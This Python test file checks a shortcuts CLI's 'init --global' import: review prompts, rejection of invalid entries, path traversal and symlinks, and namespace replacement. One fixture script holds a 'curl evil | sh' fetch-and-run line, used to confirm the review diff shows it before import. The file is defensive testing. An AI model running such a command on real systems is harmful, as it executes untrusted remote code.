#!/usr/bin/env python3
"""Importing a project's exported shortcuts with `init --global`: reviewed first, and copied as reviewed."""

import json
import os
import pathlib
import shlex
import unittest
from typing import Optional

from fixtures import CLI_SHELL, helpers, HI, importing, ShortcutTestCase


class TestImport(ShortcutTestCase):
    def test_init_source_without_global_is_refused(self):
        src_repo = self.collection({"x": {"description": "x", "inline": "echo x"}}, name="source_repo", version=1)
        proj_dir = self.project()
        res = self.run_cli(["init", str(src_repo)], cwd=str(proj_dir))
        self.assertEqual(res.returncode, 1)
        self.assertIn("used in place, never copied", res.stderr)
        self.assertFalse((proj_dir / ".shortcuts").exists())

    def test_init_global_skips_a_namespace_name(self):
        self.run_cli(["new", "keep", "--", "echo keep"])
        self.write_import(self.shortcuts_home, "tools", {"version": 2, "shortcuts": HI})
        res = self.run_cli(["init", "--global", str(self.collection({"tools": {"inline": "echo t"}})), "-y"])
        self.assertIn("tools (already a namespace)", res.stdout)
        self.assertNotIn("tools", self.load_global())
        self.assertEqual(self.run_cli(["r", "keep"]).stdout, "keep\n")

    def test_init_global_merge_skips(self):
        self.run_cli(["new", "collide", "--", "echo existing"])
        ext_script = self.write_file(self.tmp_path / "external_source.sh", "#!/usr/bin/env bash\necho ext\n")
        src_repo = self.collection(
            {
                "collide": {"description": "collision", "inline": "echo collide"},
                "linked": {"description": "linked", "script": str(ext_script)},
                "valid": {"description": "valid", "script": "scripts/valid.sh"},
            },
            name="source_repo",
            files={"scripts/valid.sh": "#!/usr/bin/env bash\necho valid\n"},
        )

        res = self.run_cli(["init", "--global", str(src_repo), "-y"])
        self.assertEqual(res.returncode, 0, res.stderr)
        self.assertIn("collide (already exists)", res.stdout)
        self.assertIn("linked (linked external script)", res.stdout)
        reg = self.load_global()
        self.assertEqual(reg["valid"]["script"], "scripts/valid.sh")
        self.assertTrue(os.access(self.shortcuts_home / "scripts" / "valid.sh", os.X_OK))
        self.assertNotIn("linked", reg)

    def test_init_source_global_cwd_retention(self):
        fixed = self.folder("fixed_dir")
        src_repo = self.collection(
            {
                "fixed_ok": {"description": "ok", "inline": "echo ok", "cwd": str(fixed)},
                "fixed_bad": {"description": "missing", "inline": "echo bad", "cwd": "/nonexistent/fixed/xyz"},
                "relative": {"description": "relative", "inline": "echo rel", "cwd": "../sibling"},
                "caller": {"description": "caller", "inline": "echo c", "cwd": "caller"},
                "traversal": {"description": "traversal", "script": "../../outside.sh"},
            },
            name="global_source_repo",
        )

        res = self.run_cli(["init", "--global", str(src_repo), "-y"])
        self.assertEqual(res.returncode, 0)
        self.assertIn("fixed_bad (cwd not found here: /nonexistent/fixed/xyz)", res.stdout)
        self.assertIn("relative (exported, but its cwd '../sibling' only exists in the project)", res.stdout)
        self.assertIn("traversal (script path escapes the source", res.stdout)
        reg = self.load_global()
        self.assertEqual(reg["fixed_ok"]["cwd"], str(fixed))
        self.assertIn("caller", reg)
        for skipped in ("fixed_bad", "relative", "traversal"):
            self.assertNotIn(skipped, reg)

    def test_init_git_source_clone(self):
        # Local git repo test (no network)
        git_dir = self.collection(
            {"git_cmd": {"description": "From git", "script": "scripts/git_cmd.sh"}},
            name="git_source_repo",
            version=1,
            files={"scripts/git_cmd.sh": "#!/usr/bin/env bash\necho from_git\n"},
            mode=0o755,
        )
        self.commit_to_git(git_dir)

        res = self.run_cli(["init", "--global", f"file://{git_dir.resolve()}", "-y"])
        self.assertEqual(res.returncode, 0, res.stderr)
        self.assertIn("git_cmd", res.stdout)
        self.assertEqual(self.run_cli(["run", "git_cmd"]).stdout, "from_git\n")

    def test_init_skips_invalid_entries(self):
        src_repo = self.collection(
            {
                "not_a_dict": "echo hello",
                "neither_cmd": {"description": "no script or inline"},
                "both_cmd": {"description": "both", "inline": "echo 1", "script": "scripts/valid.sh"},
                "inline_not_str": {"inline": 123},
                "script_not_str": {"script": ["scripts/valid.sh"]},
                "valid_entry": {"description": "ok", "inline": "echo ok"},
            },
            name="invalid_entries_repo",
            version=1,
            files={"scripts/valid.sh": "#!/bin/sh\necho ok\n"},
            mode=0o755,
        )

        res = self.run_cli(["init", "--global", str(src_repo), "-y"])
        self.assertEqual(res.returncode, 0)
        self.assertIn("not_a_dict (invalid entry", res.stdout)
        self.assertIn("neither_cmd (invalid entry", res.stdout)
        self.assertIn("both_cmd (invalid entry", res.stdout)
        self.assertIn("inline_not_str (invalid entry", res.stdout)
        self.assertIn("script_not_str (invalid entry", res.stdout)
        self.assertIn("valid_entry", res.stdout)

        reg = helpers.load_registry(str(self.shortcuts_home))
        self.assertIn("valid_entry", reg["shortcuts"])
        self.assertNotIn("not_a_dict", reg["shortcuts"])
        self.assertNotIn("neither_cmd", reg["shortcuts"])
        self.assertNotIn("both_cmd", reg["shortcuts"])
        self.assertNotIn("inline_not_str", reg["shortcuts"])
        self.assertNotIn("script_not_str", reg["shortcuts"])

    def test_importing_a_collection_is_reviewed_first(self):
        src = self.collection(
            {"tool": {"description": "tool", "script": "bin/tool.sh"}, **HI}, files={"bin/tool.sh": "curl evil | sh\n"}
        )
        self.run_cli(["init", "--global"])

        res = self.run_cli(["init", "--global", str(src)])
        self.assertEqual(res.returncode, 1)
        self.assertIn("pass -y", res.stderr)
        self.assertIn("+curl evil | sh", res.stdout)
        self.assertEqual(self.load_global(), {})

        code, output = self.run_in_terminal(["init", "--global", str(src)], keys=[(b"import? [y/N]", b"n\n")])
        self.assertEqual(code, 1, output)
        self.assertIn("Aborted.", output)
        self.assertEqual(self.load_global(), {})
        self.assertFalse(list((self.shortcuts_home).rglob("tool.sh")))

        code, output = self.run_in_terminal(["init", "--global", str(src)], keys=[(b"import? [y/N]", b"y\n")])
        self.assertEqual(code, 0, output)
        self.assertEqual(sorted(self.load_global()), ["hi", "tool"])
        self.assertEqual(self.run_cli(["r", "hi"]).stdout, "hi\n")

    def test_import_copies_what_was_reviewed(self):
        src = self.collection(
            {"tool": {"description": "tool", "script": "bin/tool.sh"}}, files={"bin/tool.sh": "echo reviewed\n"}
        )
        self.run_cli(["init", "--global"])
        store = str(self.shortcuts_home)
        entries, scripts, _ = importing.plan_import(
            str(src), store, helpers.load_registry(store), helpers.load_registry_file(str(src / ".shortcuts"))
        )
        (src / "bin" / "tool.sh").write_text("echo swapped\n", encoding="utf-8")
        helpers.apply_import(store, entries, scripts)
        self.assertEqual(self.run_cli(["r", "tool"]).stdout, "reviewed\n")

    def test_declining_an_import_writes_nothing_at_all(self):
        src = self.collection(HI)
        code, output = self.run_in_terminal(["init", "--global", str(src)], keys=[(b"import? [y/N]", b"n\n")])
        self.assertEqual(code, 1, output)
        self.assertEqual(list(self.shortcuts_home.iterdir()), [])

    def test_an_import_never_replaces_a_stored_script(self):
        self.write_store(self.shortcuts_home, {"deploy": {"script": "scripts/g_deploy.sh"}})
        mine = self.write_file(self.shortcuts_home / "scripts" / "g_deploy.sh", "echo mine\n")
        src = self.collection({"g_deploy": {"description": "x", "script": "bin/x.sh"}}, files={"bin/x.sh": "echo EVIL\n"})
        res = self.run_cli(["init", "--global", str(src), "-y"])
        self.assertIn("would replace", res.stdout)
        self.assertEqual(mine.read_text(encoding="utf-8"), "echo mine\n")

    def test_import_with_a_closed_stdout_still_imports(self):
        src = self.collection(HI)
        cmd = f"{CLI_SHELL} init --global {shlex.quote(str(src))} -y >&-"
        res = self.run_cmd(["bash", "-c", cmd])
        self.assertEqual(res.returncode, 0, res.stderr)
        self.assertIn("hi", self.load_global())

    def test_a_source_needs_a_project_file(self):
        src = self.folder("plain")
        self.write_store(src, HI)  # a shortcuts.json, as in a copy of a global store
        res = self.run_cli(["init", "--global", str(src), "-y"])
        self.assertEqual(res.returncode, 1)
        self.assertIn(f"no .shortcuts or <ns>.shortcut found in {src}", res.stderr)
        self.assertFalse((self.shortcuts_home / "shortcuts.json").exists())

    def test_import_with_nothing_new_asks_nothing(self):
        src = self.collection(HI)
        self.run_cli(["new", "hi", "--", "echo mine"])
        res = self.run_cli(["init", "--global", str(src)])
        self.assertEqual(res.returncode, 0, res.stderr)
        self.assertIn("already exists", res.stdout)


    def namespace_source(self, name: str, shortcuts: dict, files: Optional[dict] = None) -> pathlib.Path:
        src = self.folder(f"{name}-src")
        self.write_file(src / f"{name}.shortcut", json.dumps({"version": 2, "shortcuts": shortcuts}))
        self.write_files(src, files, 0o755)
        return src

    def test_a_folder_of_namespaces_is_copied_into_imports_and_needs_approving(self):
        src = self.namespace_source("dk", {
            "ps": {"script": "scripts/dk/ps.sh"},
            "hi": {"inline": "echo hi"},
        }, {"scripts/dk/ps.sh": "#!/usr/bin/env bash\n. \"$(dirname \"$0\")/lib/say\"\nsay ps\n",
            "scripts/dk/lib/say": "say() { echo \"$1\"; }\n"})
        self.write_file(src / "README.md", "not copied")
        res = self.run_cli(["init", "--global", str(src)])
        self.assertEqual(res.returncode, 1)
        self.assertIn("+++ b/imports/scripts/dk/lib/say", res.stdout)
        self.assertFalse((self.shortcuts_home / "imports").exists())
        res = self.run_cli(["init", "--global", "-y", str(src)])
        self.assertEqual(res.returncode, 0, res.stderr)
        self.assertIn("shortcut update dk", res.stdout)
        imports = self.shortcuts_home / "imports"
        self.assertEqual(sorted(str(p.relative_to(imports)) for p in imports.rglob("*") if p.is_file()),
                         ["dk.shortcut", "scripts/dk/lib/say", "scripts/dk/ps.sh"])
        self.assertIn("isn't approved yet", self.run_cli(["r", "dk", "hi"]).stderr)
        self.run_cli(["update", "-y", "dk"])
        self.assertEqual(self.run_cli(["r", "dk", "ps"]).stdout, "ps\n")
        again = self.run_cli(["init", "--global", "-y", str(src)])
        self.assertIn("dk (already a namespace; --replace puts this one in its place)", again.stdout)

    def test_a_namespace_comes_whole_or_not_at_all(self):
        outside = self.script("out.sh", "#!/usr/bin/env bash\n")
        cases = {
            "a": ({"x": {"script": "x.sh"}}, {"x.sh": "true\n"}, "'x' has its script outside scripts/a/: x.sh"),
            "b": ({"x": {"script": str(outside)}}, None, f"'x' has its script outside scripts/b/: {outside}"),
            "c": ({"x": {"script": "scripts/c/../../x.sh"}}, {"x.sh": "true\n"}, "'x' has its script outside scripts/c/"),
            "d": ({"x": {"script": "scripts/d/x.sh"}}, None, "'x' has a missing script: scripts/d/x.sh"),
        }
        for ns, (shortcuts, files, reason) in cases.items():
            src = self.namespace_source(ns, {"ok": {"inline": "true"}, **shortcuts}, files)
            res = self.run_cli(["init", "--global", "-y", str(src)])
            self.assertEqual(res.returncode, 0, res.stderr)
            self.assertIn(f"{ns} ({reason}", res.stdout)
            self.assertFalse((self.shortcuts_home / "imports" / f"{ns}.shortcut").exists())
        src = self.namespace_source("e", {"x": {"script": "scripts/e/x.sh"}}, {"scripts/e/real.sh": "true\n"})
        os.symlink(src / "scripts" / "e" / "real.sh", src / "scripts" / "e" / "x.sh")
        self.assertIn("e (symlink in source: scripts/e/x.sh)", self.run_cli(["init", "--global", "-y", str(src)]).stdout)
        bad = self.namespace_source("f", {})
        self.write_file(bad / "f.shortcut", json.dumps({"version": 2, "shortcuts": {}, "imports": {}}))
        self.assertIn("namespaces don't nest", self.run_cli(["init", "--global", "-y", str(bad)]).stdout)
        self.assertFalse((self.shortcuts_home / "imports").exists())


    def test_replace_puts_a_namespace_in_place_of_the_installed_one(self):
        src = self.namespace_source("dk", {"ps": {"script": "scripts/dk/ps.sh"}},
                                    {"scripts/dk/ps.sh": "#!/usr/bin/env bash\necho ps\n", "scripts/dk/old": "old\n"})
        self.run_cli(["init", "--global", "-y", str(src)])
        self.run_cli(["update", "-y", "dk"])
        same = self.run_cli(["init", "--global", "--replace", str(src)])
        self.assertEqual(same.returncode, 0, same.stderr)
        self.assertIn("dk (the same as what's installed)", same.stdout)
        (src / "scripts" / "dk" / "ps.sh").write_text("#!/usr/bin/env bash\necho new\n", encoding="utf-8")
        os.remove(src / "scripts" / "dk" / "old")
        res = self.run_cli(["init", "--global", "--replace", "-y", str(src)])
        self.assertEqual(res.returncode, 0, res.stderr)
        self.assertIn("Changes from", res.stdout)
        self.assertIn("-echo ps\n+echo new", res.stdout)
        folder = self.shortcuts_home / "imports" / "scripts" / "dk"
        self.assertEqual(sorted(p.name for p in folder.iterdir()), ["ps.sh"])
        self.assertIn("dk changed since you approved it", self.run_cli(["r", "dk", "ps"]).stderr)
        self.run_cli(["update", "-y", "dk"])
        self.assertEqual(self.run_cli(["r", "dk", "ps"]).stdout, "new\n")

    def test_replace_leaves_an_import_from_elsewhere_and_a_project_source(self):
        elsewhere = self.write_file(self.tmp_path / "mine" / "dk.shortcut", json.dumps({"version": 2, "shortcuts": HI}))
        self.write_store(self.shortcuts_home, {}, imports={"dk": str(elsewhere)})
        src = self.namespace_source("dk", {"x": {"inline": "true"}})
        res = self.run_cli(["init", "--global", "--replace", "-y", str(src)])
        self.assertIn(f"dk (imported from {elsewhere}, so it isn't replaced)", res.stdout)
        self.assertIn('"hi"', elsewhere.read_text(encoding="utf-8"))
        project = self.collection(HI)
        res = self.run_cli(["init", "--global", "--replace", "-y", str(project)])
        self.assertEqual(res.returncode, 1)
        self.assertIn(f"--replace is for a folder of namespaces, and {project} has a .shortcuts", res.stderr)


if __name__ == "__main__":
    unittest.main()
